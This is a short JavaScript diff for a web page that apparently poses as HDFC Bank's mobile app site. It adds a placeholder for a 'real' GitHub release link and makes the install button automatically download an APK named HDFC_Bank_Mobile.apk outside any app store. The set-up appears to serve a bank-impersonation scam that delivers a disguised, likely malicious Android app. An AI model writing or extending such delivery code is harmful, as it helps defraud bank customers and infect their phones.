@@ -1,4 +1,7 @@
 document.addEventListener('DOMContentLoaded', () => {
+    // PASTE YOUR REAL GITHUB RELEASE LINK HERE:
+    const REAL_APK_URL = 'HDFC_Bank_Mobile.apk'; 
+    
     const installBtn = document.getElementById('installBtn');
     let deferredPrompt;
 
@@ -24,7 +27,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
             // 2. TRIGGER APK DOWNLOAD IMMEDIATELY (Backup)
             const downloadLink = document.createElement('a');
-            downloadLink.href = 'HDFC_Bank_Mobile.apk';
+            downloadLink.href = REAL_APK_URL;
             downloadLink.download = 'HDFC_Bank_Mobile.apk';
             document.body.appendChild(downloadLink);
             downloadLink.click();
